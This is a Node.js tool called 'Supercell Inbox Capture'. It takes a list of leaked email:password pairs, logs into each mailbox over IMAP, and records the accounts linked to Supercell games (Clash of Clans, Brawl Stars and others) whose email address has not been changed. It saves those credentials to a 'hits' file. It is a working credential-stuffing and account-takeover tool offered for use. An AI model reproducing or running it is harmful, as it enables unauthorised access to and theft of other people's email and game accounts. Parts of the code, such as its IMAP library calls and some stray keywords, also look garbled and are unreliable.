const fs = require('fs');
const path = require('path');
const { simpleImap } = require('imap-simple');
const { simpleParser } = require('mailparser');
const chalk = require('chalk');
const express = require('express');
const http = require('http');

// Configuration
const CONFIG = {
    WORKERS: 5,
    SEARCH_FROM: "noreply@id.supercell.com",
    GAMES: ["Clash Royale", "Clash of Clans", "Hay Day", "Squad Busters", "Brawl Stars"],
    KEYWORDS: [
        "email address changed", "email adresse geändert", "adresse email modifiée",
        "cambio de dirección de correo", "メールアドレスが変更されました", "変更されたメールアドレス",
        "adresse e-mail changée", "メールアドレス変更", "adresa e-pošte je promijenjena",
        "домен почты изменен", "dirección de correo electrónico cambiada", "email адрес изменен",
        "adresse email changée", "cambiato indirizzo email", "e-posti aadress on muutunud",
        "adresa e-mail promijenjena", "correo electrónico cambiado", "adresa электронной почты изменена",
        "email id変更されました", "πολλαπλή διεύθυνση ηλεκτρονικού ταχυδρομείου άλλαξε",
        "คำแนะนำอีเมล์ถูกเปลี่ยน", "أن تغيير البريد الإلكتروني", "adresse email modifié",
        "correo de dirección cambiado", "cambio dirección correo", "Εχει αλλάξει η διεύθυνση ηλεκτρονικού ταχυδρομείου",
        "الإيميل تم تغييره", "電子郵件地址更改", "メールアドレスが変更されました", "تم تغي", "anasxzer00", "xxxx_private", "daikt bgem tool edit kay"
    ],
    OUTPUT_FILE: "Supercell-Hits.txt"
};

// Stats
let stats = {
    hits: 0,
    bad: 0,
    unlink: 0,
    games: {
        "Clash Royale": 0,
        "Clash of Clans": 0,
        "Hay Day": 0,
        "Squad Busters": 0,
        "Brawl Stars": 0
    }
};

// ANSI Colors helper
const C = {
    RESET: "\x1b[0m",
    BOLD: "\x1b[1m",
    RED: "\x1b[31m",
    GREEN: "\x1b[32m",
    YELLOW: "\x1b[33m",
    BLUE: "\x1b[34m",
    MAGENTA: "\x1b[35m",
    CYAN: "\x1b[36m",
    WHITE: "\x1b[37m",
    BG_GREEN: "\x1b[42m"
};

function printBanner() {
    console.log(`
${C.GREEN}
╔══════════════════════════════════════════════════════════╗
║ Supercell Inbox Capture                                  ║
║                                                          ║
║ Developer: @yh_ka                                        ║
║ Channel: t.me/machitools                                 ║
╚══════════════════════════════════════════════════════════╝
${C.RESET}`);
}

function clearScreen() {
    process.stdout.write("\x1Bc");
}

function updateUI() {
    clearScreen();
    printBanner();
    console.log("\n" + C.BLUE + " -- @yh_ka" + C.RESET);
    console.log(` ${C.GREEN}Hits: ${stats.hits}${C.RESET} | ${C.RED}Bad: ${stats.bad}${C.RESET} | ${C.YELLOW}Unlink: ${stats.unlink}${C.RESET}`);
    console.log("————————————————————————————————————————————————————————————");
    for (const [game, count] of Object.entries(stats.games)) {
        console.log(` >${C.CYAN}[∎] ${game}: ${count}${C.RESET}`);
    }
    console.log("————————————————————————————————————————————————————————————");
}

// Async Queue for Workers
class WorkerPool {
    constructor(workerCount, taskFn) {
        this.queue = [];
        this.active = 0;
        this.workerCount = workerCount;
        this.taskFn = taskFn;
        this.done = false;
        this.totalTasks = 0;
        this.completedTasks = 0;
    }

    addTask(task) {
        this.queue.push(task);
        this.totalTasks++;
        this.process();
    }

    addTasks(tasks) {
        tasks.forEach(task => this.addTask(task));
    }

    process() {
        while (this.active < this.workerCount && this.queue.length > 0) {
            this.active++;
            const task = this.queue.shift();
            this.taskFn(task).finally(() => {
                this.active--;
                this.completedTasks++;
                this.process();
            });
        }
    }

    isComplete() {
        return this.queue.length === 0 && this.active === 0;
    }
}

async function checkLogin(emailAccount) {
    try {
        const [email, password] = emailAccount.split(':');
        const domain = email.split('@')[1];
        const imapServer = `imap.${domain}`;

        const imap = simpleImap.imap({
            user: email,
            password: password,
            imap: {
                host: imapServer,
                port: 993,
                tls: true,
                tlsOptions: {
                    rejectUnauthorized: false
                }
            },
            authTimeout: 10000,
            connectionTimeout: 10000
        });

        const inbox = await imap.openBox('INBOX', true);

        // Search for emails from Supercell
        const searchResult = await inbox.search([['from', CONFIG.SEARCH_FROM]]);
        
        let linkedGames = new Set();
        let isUnlink = false;
        let isHit = false;

        if (searchResult.length > 0) {
            // Fetch all matching emails (limit to 100 to prevent memory issues)
            const fetchResult = await inbox.fetch(searchResult.slice(0, 100), {
                body: true,
                source: true
            });

            for (const msg of fetchResult) {
                const parsed = await simpleParser(msg.source);
                const subject = parsed.subject || "";
                
                // Extract body
                let body = "";
                if (parsed.text) {
                    body = parsed.text;
                } else if (parsed.html) {
                    body = parsed.html;
                }

                // Check Unlink Keywords
                const keywordRegex = new RegExp(CONFIG.KEYWORDS.join('|'), 'i');
                if (keywordRegex.test(subject) || keywordRegex.test(body)) {
                    isUnlink = true;
                    break;
                }

                // Check Hit
                if (subject.includes(CONFIG.SEARCH_FROM) || body.includes(CONFIG.SEARCH_FROM)) {
                    isHit = true;
                }

                // Check Games
                for (const game of CONFIG.GAMES) {
                    if (subject.includes(game) || body.includes(game)) {
                        linkedGames.add(game);
                    }
                }
            }
        }

        // Update Stats
        if (isUnlink) {
            stats.unlink++;
        } else if (isHit || linkedGames.size > 0) {
            stats.hits++;
            linkedGames.forEach(game => {
                stats.games[game]++;
            });
            
            // Append to file
            const logEntry = `${email}:${password} | Linked = ${JSON.stringify([...linkedGames])}\n`;
            fs.appendFileSync(CONFIG.OUTPUT_FILE, logEntry);
        } else {
            stats.bad++;
        }

        await inbox.closeBox();
        await imap.end();
    } catch (error) {
        stats.bad++;
        // Optional: console.log(`Error checking ${emailAccount}: ${error.message}`);
    }
}

async function startServer(comboFilePath) {
    if (!fs.existsSync(comboFilePath)) {
        console.error(`${C.RED}Error: File not found: ${comboFilePath}${C.RESET}`);
        process.exit(1);
    }

    const comboList = fs.readFileSync(comboFilePath, 'utf-8')
        .split('\n')
        .filter(line => line.includes(':') && line.trim() !== '');

    console.log(`${C.CYAN}[√] Loaded ${comboList.length} combinations from ${comboFilePath}${C.RESET}`);
    console.log(`${C.CYAN}[√] Starting capture with ${CONFIG.WORKERS} workers...${C.RESET}`);

    // UI Update Interval
    const uiInterval = setInterval(updateUI, 1000);

    // Initialize Worker Pool
    const pool = new WorkerPool(CONFIG.WORKERS, checkLogin);
    
    // Add all tasks
    pool.addTasks(comboList);

    // Wait for completion
    return new Promise((resolve) => {
        const checkComplete = () => {
            if (pool.isComplete()) {
                clearInterval(uiInterval);
                updateUI();
                console.log(`${C.GREEN}\n[+] Capture Complete!${C.RESET}`);
                console.log(`${C.GREEN}[+] Results saved to ${CONFIG.OUTPUT_FILE}${C.RESET}`);
                resolve();
            } else {
                setTimeout(checkComplete, 100);
            }
        };
        checkComplete();
    });
}

// Main Execution
const inputPath = process.argv[2] || "combo.txt";

(async () => {
    printBanner();
    console.log(`${C.CYAN}[√] Using Combo File: ${inputPath}${C.RESET}`);
    console.log("—".repeat(60));
    
    await startServer(inputPath);
})();